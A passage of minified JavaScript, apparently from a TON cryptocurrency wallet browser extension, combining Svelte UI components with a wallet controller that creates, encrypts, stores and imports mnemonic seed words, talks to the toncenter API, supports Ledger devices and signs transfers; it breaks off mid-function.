var app=function(){"use strict";function e(){}const t=e=>e;function s(e,t){for(const s in t)e[s]=t[s];return e}function n(e){return e()}function i(){return Object.create(null)}function o(e){e.forEach(n)}function a(e){return"function"==typeof e}function r(e,t){return e!=e?t==t:e!==t||e&&"object"==typeof e||"function"==typeof e}function l(e,t,s,n){if(e){const i=c(e,t,s,n);return e[0](i)}}function c(e,t,n,i){return e[1]&&i?s(n.ctx.slice(),e[1](i(t))):n.ctx}function d(e,t,s,n){if(e[2]&&n){const i=e[2](n(s));if(void 0===t.dirty)return i;if("object"==typeof i){const e=[],s=Math.max(t.dirty.length,i.length);for(let n=0;n<s;n+=1)e[n]=t.dirty[n]|i[n];return e}return t.dirty|i}return t.dirty}function u(e,t,s,n,i,o){if(i){const a=c(t,s,n,o);e.p(a,i)}}function h(e){if(e.ctx.length>32){const t=[],s=e.ctx.length/32;for(let e=0;e<s;e++)t[e]=-1;return t}return-1}function p(e){const t={};for(const s in e)"$"!==s[0]&&(t[s]=e[s]);return t}function w(e){return null==e?"":e}const m="undefined"!=typeof window;let g=m?()=>window.performance.now():()=>Date.now(),f=m?e=>requestAnimationFrame(e):e;const y=new Set;function b(e){y.forEach((t=>{t.c(e)||(y.delete(t),t.f())})),0!==y.size&&f(b)}function T(e,t){e.appendChild(t)}function $(e){if(!e)return document;const t=e.getRootNode?e.getRootNode():e.ownerDocument;return t&&t.host?t:e.ownerDocument}function v(e){const t=S("style");return function(e,t){T(e.head||e,t)}($(e),t),t.sheet}function A(e,t,s){e.insertBefore(t,s||null)}function C(e){e.parentNode.removeChild(e)}function S(e){return document.createElement(e)}function _(e){return document.createTextNode(e)}function I(){return _(" ")}function x(e,t,s,n){return e.addEventListener(t,s,n),()=>e.removeEventListener(t,s,n)}function P(e,t,s){null==s?e.removeAttribute(t):e.getAttribute(t)!==s&&e.setAttribute(t,s)}function k(e,t){t=""+t,e.wholeText!==t&&(e.data=t)}function E(e,t){e.value=null==t?"":t}function V(e,t,s,n){null===s?e.style.removeProperty(t):e.style.setProperty(t,s,n?"important":"")}function W(e,t,s){e.classList[s?"add":"remove"](t)}function D(e,t,{bubbles:s=!1,cancelable:n=!1}={}){const i=document.createEvent("CustomEvent");return i.initCustomEvent(e,s,n,t),i}const K=new Map;let M,R=0;function B(e,t,s,n,i,o,a,r=0){const l=16.666/n;let c="{\n";for(let e=0;e<=1;e+=l){const n=t+(s-t)*o(e);c+=100*e+`%{${a(n,1-n)}}\n`}const d=c+`100% {${a(s,1-s)}}\n}`,u=`__svelte_${function(e){let t=5381,s=e.length;for(;s--;)t=(t<<5)-t^e.charCodeAt(s);return t>>>0}(d)}_${r}`,h=$(e),{stylesheet:p,rules:w}=K.get(h)||function(e,t){const s={stylesheet:v(t),rules:{}};return K.set(e,s),s}(h,e);w[u]||(w[u]=!0,p.insertRule(`@keyframes ${u} ${d}`,p.cssRules.length));const m=e.style.animation||"";return e.style.animation=`${m?`${m}, `:""}${u} ${n}ms linear ${i}ms 1 both`,R+=1,u}function L(e,t){const s=(e.style.animation||"").split(", "),n=s.filter(t?e=>e.indexOf(t)<0:e=>-1===e.indexOf("__svelte")),i=s.length-n.length;i&&(e.style.animation=n.join(", "),R-=i,R||f((()=>{R||(K.forEach((e=>{const{stylesheet:t}=e;let s=t.cssRules.length;for(;s--;)t.deleteRule(s);e.rules={}})),K.clear())})))}function N(e){M=e}function O(){if(!M)throw new Error("Function called outside component initialization");return M}function z(e,t){const s=e.$$.callbacks[t.type];s&&s.slice().forEach((e=>e.call(this,t)))}const F=[],H=[],j=[],q=[],U=Promise.resolve();let Y=!1;function G(){Y||(Y=!0,U.then(ee))}function J(e){j.push(e)}const Q=new Set;let X,Z=0;function ee(){const e=M;do{for(;Z<F.length;){const e=F[Z];Z++,N(e),te(e.$$)}for(N(null),F.length=0,Z=0;H.length;)H.pop()();for(let e=0;e<j.length;e+=1){const t=j[e];Q.has(t)||(Q.add(t),t())}j.length=0}while(F.length);for(;q.length;)q.pop()();Y=!1,Q.clear(),N(e)}function te(e){if(null!==e.fragment){e.update(),o(e.before_update);const t=e.dirty;e.dirty=[-1],e.fragment&&e.fragment.p(e.ctx,t),e.after_update.forEach(J)}}function se(e,t,s){e.dispatchEvent(D(`${t?"intro":"outro"}${s}`))}const ne=new Set;let ie;function oe(){ie={r:0,c:[],p:ie}}function ae(){ie.r||o(ie.c),ie=ie.p}function re(e,t){e&&e.i&&(ne.delete(e),e.i(t))}function le(e,t,s,n){if(e&&e.o){if(ne.has(e))return;ne.add(e),ie.c.push((()=>{ne.delete(e),n&&(s&&e.d(1),n())})),e.o(t)}}const ce={duration:0};function de(s,n,i,r){let l=n(s,i),c=r?0:1,d=null,u=null,h=null;function p(){h&&L(s,h)}function w(e,t){const s=e.b-c;return t*=Math.abs(s),{a:c,b:e.b,d:s,duration:t,start:e.start,end:e.start+t,group:e.group}}function m(n){const{delay:i=0,duration:a=300,easing:r=t,tick:m=e,css:T}=l||ce,$={start:g()+i,b:n};n||($.group=ie,ie.r+=1),d||u?u=$:(T&&(p(),h=B(s,c,n,a,i,r,T)),n&&m(0,1),d=w($,a),J((()=>se(s,n,"start"))),function(e){let t;0===y.size&&f(b),new Promise((s=>{y.add(t={c:e,f:s})}))}((e=>{if(u&&e>u.start&&(d=w(u,a),u=null,se(s,d.b,"start"),T&&(p(),h=B(s,c,d.b,d.duration,0,r,l.css))),d)if(e>=d.end)m(c=d.b,1-c),se(s,d.b,"end"),u||(d.b?p():--d.group.r||o(d.group.c)),d=null;else if(e>=d.start){const t=e-d.start;c=d.a+d.d*r(t/d.duration),m(c,1-c)}return!(!d&&!u)})))}return{run(e){a(l)?(X||(X=Promise.resolve(),X.then((()=>{X=null}))),X).then((()=>{l=l(),m(e)})):m(e)},end(){p(),d=u=null}}}function ue(e){e&&e.c()}function he(e,t,s,i){const{fragment:r,on_mount:l,on_destroy:c,after_update:d}=e.$$;r&&r.m(t,s),i||J((()=>{const t=l.map(n).filter(a);c?c.push(...t):o(t),e.$$.on_mount=[]})),d.forEach(J)}function pe(e,t){const s=e.$$;null!==s.fragment&&(o(s.on_destroy),s.fragment&&s.fragment.d(t),s.on_destroy=s.fragment=null,s.ctx=[])}function we(t,s,n,a,r,l,c,d=[-1]){const u=M;N(t);const h=t.$$={fragment:null,ctx:null,props:l,update:e,not_equal:r,bound:i(),on_mount:[],on_destroy:[],on_disconnect:[],before_update:[],after_update:[],context:new Map(s.context||(u?u.$$.context:[])),callbacks:i(),dirty:d,skip_bound:!1,root:s.target||u.$$.root};c&&c(h.root);let p=!1;if(h.ctx=n?n(t,s.props||{},((e,s,...n)=>{const i=n.length?n[0]:s;return h.ctx&&r(h.ctx[e],h.ctx[e]=i)&&(!h.skip_bound&&h.bound[e]&&h.bound[e](i),p&&function(e,t){-1===e.$$.dirty[0]&&(F.push(e),G(),e.$$.dirty.fill(0)),e.$$.dirty[t/31|0]|=1<<t%31}(t,e)),s})):[],h.update(),p=!0,o(h.before_update),h.fragment=!!a&&a(h.ctx),s.target){if(s.hydrate){const e=function(e){return Array.from(e.childNodes)}(s.target);h.fragment&&h.fragment.l(e),e.forEach(C)}else h.fragment&&h.fragment.c();s.intro&&re(t.$$.fragment),he(t,s.target,s.anchor,s.customElement),ee()}N(u)}class me{$destroy(){pe(this,1),this.$destroy=e}$on(e,t){const s=this.$$.callbacks[e]||(this.$$.callbacks[e]=[]);return s.push(t),()=>{const e=s.indexOf(t);-1!==e&&s.splice(e,1)}}$set(e){var t;this.$$set&&(t=e,0!==Object.keys(t).length)&&(this.$$.skip_bound=!0,this.$$set(e),this.$$.skip_bound=!1)}}var ge=self.localStorage;function fe(e){let t,s,n,i,o,a;const r=e[10].default,c=l(r,e,e[9],null);return{c(){t=S("button"),s=S("span"),c&&c.c(),P(t,"class",n=w(e[2])+" svelte-1a18by4"),V(t,"width",e[1]?"":e[0]),P(t,"type","button")},m(n,r){A(n,t,r),T(t,s),c&&c.m(s,null),i=!0,o||(a=x(t,"click",e[11]),o=!0)},p(e,[s]){c&&c.p&&(!i||512&s)&&u(c,r,e,e[9],i?d(r,e[9],s,null):h(e[9]),null),(!i||4&s&&n!==(n=w(e[2])+" svelte-1a18by4"))&&P(t,"class",n),(!i||3&s)&&V(t,"width",e[1]?"":e[0])},i(e){i||(re(c,e),i=!0)},o(e){le(c,e),i=!1},d(e){e&&C(t),c&&c.d(e),o=!1,a()}}}function ye(e,t,n){let i,{$$slots:o={},$$scope:a}=t,{size:r="lg"}=t,{type:l="default"}=t,{icon:c=""}=t,{label:d=""}=t,{width:u=""}=t,{wide:h=!1}=t,{loading:w=!1}=t,{disabled:m=!1}=t,g=t.class||t.className||"";return e.$$set=e=>{n(13,t=s(s({},t),p(e))),"size"in e&&n(3,r=e.size),"type"in e&&n(4,l=e.type),"icon"in e&&n(5,c=e.icon),"label"in e&&n(6,d=e.label),"width"in e&&n(0,u=e.width),"wide"in e&&n(1,h=e.wide),"loading"in e&&n(7,w=e.loading),"disabled"in e&&n(8,m=e.disabled),"$$scope"in e&&n(9,a=e.$$scope)},e.$$.update=()=>{410&e.$$.dirty&&n(2,i=[l,r,g,h&&"wide",w&&"loading",m&&"disabled"].filter((e=>e)).join(" "))},t=p(t),[u,h,i,r,l,c,d,w,m,a,o,function(t){z.call(this,e,t)}]}class be extends me{constructor(e){super(),we(this,e,ye,fe,r,{size:3,type:4,icon:5,label:6,width:0,wide:1,loading:7,disabled:8})}}function Te(t){let s,n,i,a,r,l;return{c(){s=S("div"),n=S("div"),i=S("input"),P(i,"type","text"),P(i,"name",t[8]),P(i,"placeholder",t[4]),i.readOnly=t[2],i.disabled=t[3],P(i,"autocomplete","off"),P(i,"class","svelte-1tj1kcx"),P(n,"class","inp svelte-1tj1kcx"),P(s,"class",a=w(t[9])+" svelte-1tj1kcx"),P(s,"style",t[6]),W(s,"error",t[7]),W(s,"success",t[5]),W(s,"readonly",t[2]),W(s,"disabled",t[3])},m(e,o){A(e,s,o),T(s,n),T(n,i),t[27](i),E(i,t[0]),r||(l=[x(i,"input",t[28]),x(i,"focus",t[10]),x(i,"blur",t[11]),x(i,"input",t[12]),x(i,"focus",t[20]),x(i,"blur",t[21]),x(i,"input",t[22]),x(i,"change",t[23]),x(i,"keypress",t[24]),x(i,"keydown",t[25]),x(i,"keyup",t[26])],r=!0)},p(e,t){256&t[0]&&P(i,"name",e[8]),16&t[0]&&P(i,"placeholder",e[4]),4&t[0]&&(i.readOnly=e[2]),8&t[0]&&(i.disabled=e[3]),1&t[0]&&i.value!==e[0]&&E(i,e[0]),512&t[0]&&a!==(a=w(e[9])+" svelte-1tj1kcx")&&P(s,"class",a),64&t[0]&&P(s,"style",e[6]),640&t[0]&&W(s,"error",e[7]),544&t[0]&&W(s,"success",e[5]),516&t[0]&&W(s,"readonly",e[2]),520&t[0]&&W(s,"disabled",e[3])},i:e,o:e,d(e){e&&C(s),t[27](null),r=!1,o(l)}}}function $e(e,t,n){let i,o,a,{size:r="md"}=t,{value:l=""}=t,{readonly:c=!1}=t,{disabled:d=!1}=t,{placeholder:u=null}=t,{validateOnBlur:h=!1}=t,{rules:w=[]}=t,{success:m=!1}=t,{style:g=null}=t,{inputElement:f=null}=t,{message:y=""}=t,{error:b=""}=t,{name:T=""}=t,$=t.class||t.className||"",v=!1,A=[];function C(){return A=w.map((e=>e(l))).filter((e=>"string"==typeof e)),o=!!A.length||!!b,o}return e.$$set=e=>{n(32,t=s(s({},t),p(e))),"size"in e&&n(13,r=e.size),"value"in e&&n(0,l=e.value),"readonly"in e&&n(2,c=e.readonly),"disabled"in e&&n(3,d=e.disabled),"placeholder"in e&&n(4,u=e.placeholder),"validateOnBlur"in e&&n(14,h=e.validateOnBlur),"rules"in e&&n(15,w=e.rules),"success"in e&&n(5,m=e.success),"style"in e&&n(6,g=e.style),"inputElement"in e&&n(1,f=e.inputElement),"message"in e&&n(16,y=e.message),"error"in e&&n(7,b=e.error),"name"in e&&n(8,T=e.name)},e.$$.update=()=>{1&e.$$.dirty[0]&&n(19,i=!!l),128&e.$$.dirty[0]&&(o=!!b),794624&e.$$.dirty[0]&&n(9,a=[$,r,v&&"focused",i&&"filled"].filter((e=>e)).join(" "))},t=p(t),[l,f,c,d,u,m,g,b,T,a,function(){n(18,v=!0)},function(){n(18,v=!1),h&&C()},function(){h||C()},r,h,w,y,C,v,i,function(t){z.call(this,e,t)},function(t){z.call(this,e,t)},function(t){z.call(this,e,t)},function(t){z.call(this,e,t)},function(t){z.call(this,e,t)},function(t){z.call(this,e,t)},function(t){z.call(this,e,t)},function(e){H[e?"unshift":"push"]((()=>{f=e,n(1,f)}))},function(){l=this.value,n(0,l)}]}class ve extends me{constructor(e){super(),we(this,e,$e,Te,r,{size:13,value:0,readonly:2,disabled:3,placeholder:4,validateOnBlur:14,rules:15,success:5,style:6,inputElement:1,message:16,error:7,name:8,validate:17},null,[-1,-1])}get validate(){return this.$$.ctx[17]}}function Ae(t){let s,n,i,o,r;const c=t[2].default,p=l(c,t,t[1],null);return{c(){s=S("div"),p&&p.c(),s.hidden=!0},m(l,c){var d;A(l,s,c),p&&p.m(s,null),i=!0,o||(d=n=Ce.call(null,s,t[0]),r=d&&a(d.destroy)?d.destroy:e,o=!0)},p(e,[t]){p&&p.p&&(!i||2&t)&&u(p,c,e,e[1],i?d(c,e[1],t,null):h(e[1]),null),n&&a(n.update)&&1&t&&n.update.call(null,e[0])},i(e){i||(re(p,e),i=!0)},o(e){le(p,e),i=!1},d(e){e&&C(s),p&&p.d(e),o=!1,r()}}}function Ce(e,t="body"){let s;async function n(n){if("string"==typeof(t=n)){if(s=document.querySelector(t),null===s&&(await(G(),U),s=document.querySelector(t)),null===s)throw new Error(`No element found matching css selector: "${t}"`)}else{if(!(t instanceof HTMLElement))throw new TypeError(`Unknown portal target type: ${null===t?"null":typeof t}. Allowed types: string (CSS selector) or HTMLElement.`);s=t}s.appendChild(e),e.hidden=!1}return n(t),{update:n,destroy:function(){e.parentNode&&e.parentNode.removeChild(e)}}}function Se(e,t,s){let{$$slots:n={},$$scope:i}=t,{target:o="body"}=t;return e.$$set=e=>{"target"in e&&s(0,o=e.target),"$$scope"in e&&s(1,i=e.$$scope)},[o,i,n]}class _e extends me{constructor(e){super(),we(this,e,Se,Ae,r,{target:0})}}function Ie(e,{delay:s=0,duration:n=400,easing:i=t}={}){const o=+getComputedStyle(e).opacity;return{delay:s,duration:n,easing:i,css:e=>"opacity: "+e*o}}const xe=e=>({}),Pe=e=>({}),ke=e=>({}),Ee=e=>({});function Ve(e){let t,s;return t=new _e({props:{$$slots:{default:[Ke]},$$scope:{ctx:e}}}),{c(){ue(t.$$.fragment)},m(e,n){he(t,e,n),s=!0},p(e,s){const n={};1534&s&&(n.$$scope={dirty:s,ctx:e}),t.$set(n)},i(e){s||(re(t.$$.fragment,e),s=!0)},o(e){le(t.$$.fragment,e),s=!1},d(e){pe(t,e)}}}function We(e){let t,s;return{c(){t=S("h2"),s=_(e[4]),P(t,"class","title svelte-lupfo5")},m(e,n){A(e,t,n),T(t,s)},p(e,t){16&t&&k(s,e[4])},d(e){e&&C(t)}}}function De(e){let t,s;const n=e[9].controls,i=l(n,e,e[10],Pe);return{c(){t=S("div"),i&&i.c(),P(t,"class","controls svelte-lupfo5")},m(e,n){A(e,t,n),i&&i.m(t,null),s=!0},p(e,t){i&&i.p&&(!s||1024&t)&&u(i,n,e,e[10],s?d(n,e[10],t,xe):h(e[10]),Pe)},i(e){s||(re(i,e),s=!0)},o(e){le(i,e),s=!1},d(e){e&&C(t),i&&i.d(e)}}}function Ke(e){let t,s,n,i,o,r,c,p,w,m,g,f;const y=e[9].prepend,b=l(y,e,e[10],Ee);let $=e[4]&&!e[2]&&We(e);const v=e[9].default,_=l(v,e,e[10],null);let k=e[8].controls&&De(e);return{c(){t=S("div"),s=S("div"),n=I(),i=S("div"),b&&b.c(),o=I(),r=S("div"),$&&$.c(),c=I(),_&&_.c(),p=I(),k&&k.c(),P(s,"class","overlay svelte-lupfo5"),P(i,"class","modal svelte-lupfo5"),W(i,"full",e[6]),W(i,"modal--empty-desc",e[3]),W(i,"modal--empty",e[2]),P(t,"class","wrapper svelte-lupfo5"),V(t,"--modal-width",e[5]),V(t,"z-index",e[1])},m(l,d){A(l,t,d),T(t,s),T(t,n),T(t,i),b&&b.m(i,null),T(i,o),T(i,r),$&&$.m(r,null),T(r,c),_&&_.m(r,null),T(i,p),k&&k.m(i,null),m=!0,g||(f=x(s,"click",(function(){a(e[7])&&e[7].apply(this,arguments)})),g=!0)},p(s,n){e=s,b&&b.p&&(!m||1024&n)&&u(b,y,e,e[10],m?d(y,e[10],n,ke):h(e[10]),Ee),e[4]&&!e[2]?$?$.p(e,n):($=We(e),$.c(),$.m(r,c)):$&&($.d(1),$=null),_&&_.p&&(!m||1024&n)&&u(_,v,e,e[10],m?d(v,e[10],n,null):h(e[10]),null),e[8].controls?k?(k.p(e,n),256&n&&re(k,1)):(k=De(e),k.c(),re(k,1),k.m(i,null)):k&&(oe(),le(k,1,1,(()=>{k=null})),ae()),64&n&&W(i,"full",e[6]),8&n&&W(i,"modal--empty-desc",e[3]),4&n&&W(i,"modal--empty",e[2]),(!m||32&n)&&V(t,"--modal-width",e[5]),(!m||2&n)&&V(t,"z-index",e[1])},i(e){m||(re(b,e),re(_,e),re(k),J((()=>{w||(w=de(t,Ie,{duration:100},!0)),w.run(1)})),m=!0)},o(e){le(b,e),le(_,e),le(k),w||(w=de(t,Ie,{duration:100},!1)),w.run(0),m=!1},d(e){e&&C(t),b&&b.d(e),$&&$.d(),_&&_.d(e),k&&k.d(),e&&w&&w.end(),g=!1,f()}}}function Me(e){let t,s,n=e[0]&&Ve(e);return{c(){n&&n.c(),t=_("")},m(e,i){n&&n.m(e,i),A(e,t,i),s=!0},p(e,[s]){e[0]?n?(n.p(e,s),1&s&&re(n,1)):(n=Ve(e),n.c(),re(n,1),n.m(t.parentNode,t)):n&&(oe(),le(n,1,1,(()=>{n=null})),ae())},i(e){s||(re(n),s=!0)},o(e){le(n),s=!1},d(e){n&&n.d(e),e&&C(t)}}}function Re(e,t,s){let{$$slots:n={},$$scope:i}=t;const o=function(e){const t={};for(const s in e)t[s]=!0;return t}(n),a=function(){const e=O();return(t,s,{cancelable:n=!1}={})=>{const i=e.$$.callbacks[t];if(i){const o=D(t,s,{cancelable:n});return i.slice().forEach((t=>{t.call(e,o)})),!o.defaultPrevented}return!0}}();let{z_index:r=100}=t,{empty:l=!1}=t,{emptyDesc:c=!1}=t,{title:d=""}=t,{open:u=!1}=t,{width:h="40rem"}=t,{fullScreen:p=!1}=t,{close:w=(()=>{s(0,u=!1),a("modalClosed")})}=t;return e.$$set=e=>{"z_index"in e&&s(1,r=e.z_index),"empty"in e&&s(2,l=e.empty),"emptyDesc"in e&&s(3,c=e.emptyDesc),"title"in e&&s(4,d=e.title),"open"in e&&s(0,u=e.open),"width"in e&&s(5,h=e.width),"fullScreen"in e&&s(6,p=e.fullScreen),"close"in e&&s(7,w=e.close),"$$scope"in e&&s(10,i=e.$$scope)},[u,r,l,c,d,h,p,w,o,n,i]}class Be extends me{constructor(e){super(),we(this,e,Re,Me,r,{z_index:1,empty:2,emptyDesc:3,title:4,open:0,width:5,fullScreen:6,close:7})}}function Le(e){let t;return{c(){t=_("Confirm")},m(e,s){A(e,t,s)},d(e){e&&C(t)}}}function Ne(e){let t,s,n,i,o,a,r,l,c,d;function u(t){e[4](t)}let h={};return void 0!==e[2]&&(h.value=e[2]),n=new ve({props:h}),H.push((()=>function(e,t,s){const n=e.$$.props[t];void 0!==n&&(e.$$.bound[n]=s,s(e.$$.ctx[n]))}(n,"value",u))),a=new be({props:{type:"accent",$$slots:{default:[Le]},$$scope:{ctx:e}}}),a.$on("click",e[5]),{c(){t=S("h2"),t.textContent="Enter your password",s=I(),ue(n.$$.fragment),o=I(),ue(a.$$.fragment),r=I(),l=S("div"),c=_(e[3]),P(l,"class","error")},m(e,i){A(e,t,i),A(e,s,i),he(n,e,i),A(e,o,i),he(a,e,i),A(e,r,i),A(e,l,i),T(l,c),d=!0},p(e,t){const s={};var o;!i&&4&t&&(i=!0,s.value=e[2],o=()=>i=!1,q.push(o)),n.$set(s);const r={};64&t&&(r.$$scope={dirty:t,ctx:e}),a.$set(r),(!d||8&t)&&k(c,e[3])},i(e){d||(re(n.$$.fragment,e),re(a.$$.fragment,e),d=!0)},o(e){le(n.$$.fragment,e),le(a.$$.fragment,e),d=!1},d(e){e&&C(t),e&&C(s),pe(n,e),e&&C(o),pe(a,e),e&&C(r),e&&C(l)}}}function Oe(e){let t,s;return t=new Be({props:{open:e[1],$$slots:{default:[Ne]},$$scope:{ctx:e}}}),{c(){ue(t.$$.fragment)},m(e,n){he(t,e,n),s=!0},p(e,[s]){const n={};2&s&&(n.open=e[1]),77&s&&(n.$$scope={dirty:s,ctx:e}),t.$set(n)},i(e){s||(re(t.$$.fragment,e),s=!0)},o(e){le(t.$$.fragment,e),s=!1},d(e){pe(t,e)}}}function ze(e,t,s){let{confirmPassword:n}=t,{open:i=!1}=t,o="",a="";return e.$$set=e=>{"confirmPassword"in e&&s(0,n=e.confirmPassword),"open"in e&&s(1,i=e.open)},[n,i,o,a,function(e){o=e,s(2,o)},()=>{try{n(o),s(3,a="")}catch(e){s(3,a="ERROR")}}]}class Fe extends me{constructor(e){super(),we(this,e,ze,Oe,r,{confirmPassword:0,open:1})}}const He=TonWeb.utils.BN,je=TonWeb.utils.nacl,qe=TonWeb.utils.Address,Ue=TonWeb.utils.fromNano;let Ye=-1,Ge=new Set,Je=null;const Qe=[];let Xe=null;const Ze=()=>new Promise((async e=>{if(Ye>-1)return chrome.windows.update(Ye,{focused:!0}),e();const t=await ge.getItem("windowState")||{};t.top=t.top||0,t.left=t.left||0,t.height=t.height||800,t.width=t.width||480,chrome.windows.create(Object.assign(t,{url:"index.html",type:"popup",focused:!0}),(t=>{Ye=t.id,e()}))}));const et=!!(self.chrome&&chrome.runtime&&chrome.runtime.onConnect),tt="v3R2";class st{constructor(){this.isTestnet=!1,this.isDebug=!1,this.myAddress=null,this.publicKeyHex=null,this.myMnemonicWords=null,this.balance=null,this.walletContract=null,this.transactions=[],this.updateIntervalId=0,this.lastTransactionTime=0,this.isContractInitialized=!1,this.sendingData=null,this.processingVisible=!1,this.ledgerApp=null,this.isLedger=!1,self.view&&(self.view.controller=this),this.pendingMessageResolvers=new Map,this._lastMsgId=1,this.whenReady=this._init()}debug(...e){this.isDebug&&console.log(...e)}static async wordsToPrivateKey(e){const t=await TonWeb.mnemonic.mnemonicToKeyPair(e);return TonWeb.utils.bytesToBase64(t.secretKey.slice(0,32))}static async saveWords(e,t){await ge.setItem("words",await async function(e,t){const s=(new TextEncoder).encode(t),n=await crypto.subtle.digest("SHA-256",s),i=crypto.getRandomValues(new Uint8Array(12)),o={name:"AES-GCM",iv:i},a=await crypto.subtle.importKey("raw",n,o,!1,["encrypt"]),r=(new TextEncoder).encode(e),l=await crypto.subtle.encrypt(o,a,r),c=Array.from(new Uint8Array(l)).map((e=>String.fromCharCode(e))).join(""),d=btoa(c);return Array.from(i).map((e=>("00"+e.toString(16)).slice(-2))).join("")+d}(e.join(","),t))}static async loadWords(e){return(await async function(e,t){const s=(new TextEncoder).encode(t),n=await crypto.subtle.digest("SHA-256",s),i=e.slice(0,24).match(/.{2}/g).map((e=>parseInt(e,16))),o={name:"AES-GCM",iv:new Uint8Array(i)},a=await crypto.subtle.importKey("raw",n,o,!1,["decrypt"]),r=atob(e.slice(24)),l=new Uint8Array(r.match(/[\s\S]/g).map((e=>e.charCodeAt(0)))),c=await crypto.subtle.decrypt(o,a,l);return(new TextDecoder).decode(c)}(await ge.getItem("words"),e)).split(",")}async getWallet(){return this.ton.provider.getWalletInfo(this.myAddress)}checkContractInitialized(e){return"active"===e.account_state}getBalance(e){return new He(e.balance)}async _init(){return new Promise((async e=>{await ge.removeItem("pwdHash"),this.isTestnet=et?await ge.getItem("isTestnet"):self.location.href.indexOf("testnet")>-1,this.isDebug=et?await ge.getItem("isDebug"):self.location.href.indexOf("debug")>-1;const t=this.isTestnet?TONCENTER_API_KEY_WEB_TEST:TONCENTER_API_KEY_WEB_MAIN,s=this.isTestnet?TONCENTER_API_KEY_EXT_TEST:TONCENTER_API_KEY_EXT_MAIN;et&&!await ge.getItem("address")&&await this._restoreDeprecatedStorage(),this.ton=new TonWeb(new TonWeb.HttpProvider(this.isTestnet?"https://testnet.toncenter.com/api/v2/jsonRPC":"https://toncenter.com/api/v2/jsonRPC",{apiKey:et?s:t})),this.myAddress=await ge.getItem("address"),this.publicKeyHex=await ge.getItem("publicKey"),this.myAddress&&await ge.getItem("words")?("true"===await ge.getItem("isLedger")&&(this.isLedger=!0,this.sendToView("setIsLedger",this.isLedger)),await this.showMain()):(await ge.clear(),this.sendToView("showScreen",{name:"start",noAnimation:!0})),this.sendToView("setIsTestnet",this.isTestnet),e()}))}async _restoreDeprecatedStorage(){const{address:e,words:t,walletVersion:s,magic:n,proxy:i}=await this.sendToView("restoreDeprecatedStorage",void 0,!0,!0);e&&t&&await Promise.all([ge.setItem("address",e),ge.setItem("words",t),ge.setItem("walletVersion",s),ge.setItem("magic",n),ge.setItem("proxy",i)])}async toggleTestnet(){this.isTestnet=!this.isTestnet,this.isTestnet?await ge.setItem("isTestnet","true"):await ge.removeItem("isTestnet"),this.clearVars(),await this._init(),await this.sendToView("setIsTestnet",this.isTestnet)}async toggleDebug(){this.isDebug=!this.isDebug,this.isDebug?await ge.setItem("isDebug","true"):await ge.removeItem("isDebug")}async getTransactions(e=20){function t(e){if(!e.msg_data)return"";if("msg.dataText"!==e.msg_data["@type"])return"";const t=e.msg_data.text;return(new TextDecoder).decode(TonWeb.utils.base64ToBytes(t))}const s=[],n=await this.ton.getTransactions(this.myAddress,e);for(let e of n){let n=new He(e.in_msg.value);for(let t of e.out_msgs)n=n.sub(new He(t.value));let i="",o="",a="";e.in_msg.source?(i=e.in_msg.source,o=e.in_msg.destination,a=t(e.in_msg)):e.out_msgs.length&&(i=e.out_msgs[0].source,o=e.out_msgs[0].destination,a=t(e.out_msgs[0])),o&&s.push({amount:n.toString(),from_addr:i,to_addr:o,fee:e.fee.toString(),storageFee:e.storage_fee.toString(),otherFee:e.other_fee.toString(),comment:a,date:1e3*e.utime})}return s}async sign(e,t,s,n,i){let o=(await this.getWallet(this.myAddress)).seqno;o||(o=0);const a=n?n.secretKey:null;return this.walletContract.methods.transfer({secretKey:a,toAddress:e,amount:t,seqno:o,payload:s,sendMode:3,stateInit:i})}async showCreated(){this.sendToView("showScreen",{name:"created"}),this.sendToView("disableCreated",!0),this.myMnemonicWords=await TonWeb.mnemonic.generateMnemonic();const e=await st.wordsToPrivateKey(this.myMnemonicWords),t=je.sign.keyPair.fromSeed(TonWeb.utils.base64ToBytes(e)),s=tt,n=this.ton.wallet.all.v3R2;this.walletContract=new n(this.ton.provider,{publicKey:t.publicKey,wc:0}),this.myAddress=(await this.walletContract.getAddress()).toString(!0,!0,!0),this.publicKeyHex=TonWeb.utils.bytesToHex(t.publicKey),await ge.setItem("publicKey",this.publicKeyHex),await ge.setItem("walletVersion",s),this.sendToView("disableCreated",!1)}async createPrivateKey(){this.showBackup(this.myMnemonicWords,!0)}onBackupWalletClick(){this.afterEnterPassword=async e=>{this.showBackup(e)},this.sendToView("showPopup",{name:"enterPassword"})}showBackup(e,t){this.sendToView("showScreen",{name:"backup",words:e,isFirst:t})}async onBackupDone(){await ge.getItem("words")?this.sendToView("showScreen",{name:"main"}):this.sendToView("showScreen",{name:"wordsConfirm",words:this.myMnemonicWords})}onConfirmDone(e){if(e){let t=!0;if(Object.keys(e).forEach((s=>{this.myMnemonicWords[s]!==e[s]&&(t=!1)})),!t)return;this.showCreatePassword()}}async createLedger(e){let t;switch(e){case"hid":t=await TonWeb.ledger.TransportWebHID.create();break;case"ble":t=await TonWeb.ledger.BluetoothTransport.create();break;default:throw new Error("unknown transportType"+e)}t.setDebugMode(!0),this.isLedger=!0,this.ledgerApp=new TonWeb.ledger.AppTon(t,this.ton);const s=(await this.ledgerApp.getAppConfiguration()).version;if(this.debug("ledgerAppConfig=",s),!s.startsWith("2"))throw alert("Please update your Ledger TON-app to v2.0.1 or upper or use old wallet version https://tonwallet.me/prev/"),new Error("outdated ledger ton-app version");const{publicKey:n}=await this.ledgerApp.getPublicKey(0,!1),i=new(0,this.ton.wallet.all.v3R1)(this.ton.provider,{publicKey:n,wc:0});this.walletContract=i;const o=await i.getAddress();this.myAddress=o.toString(!0,!0,!0),this.publicKeyHex=TonWeb.utils.bytesToHex(n)}async importLedger(e){await this.createLedger(e),await ge.setItem("walletVersion",this.walletContract.getName()),await ge.setItem("address",this.myAddress),await ge.setItem("isLedger","true"),await ge.setItem("ledgerTransportType",e),await ge.setItem("words","ledger"),await ge.setItem("publicKey",this.publicKeyHex),this.sendToView("setIsLedger",this.isLedger),this.sendToView("showScreen",{name:"readyToGo"})}showImport(){this.sendToView("showScreen",{name:"import"})}async import(e){if(this.myMnemonicWords=e,this.myMnemonicWords)try{const e=await st.wordsToPrivateKey(this.myMnemonicWords),t=je.sign.keyPair.fromSeed(TonWeb.utils.base64ToBytes(e));let s=[];for(let e of this.ton.wallet.list){const n=new e(this.ton.provider,{publicKey:t.publicKey,wc:0}),i=(await n.getAddress()).toString(!0,!0,!0),o=await this.ton.provider.getWalletInfo(i),a=this.getBalance(o);a.gt(new He(0))&&s.push({balance:a,clazz:e}),this.debug(n.getName(),i,o,a.toString())}let n=this.ton.wallet.all.v3R2;s.length>0&&(s.sort(((e,t)=>e.balance.cmp(t.balance))),n=s[s.length-1].clazz),await 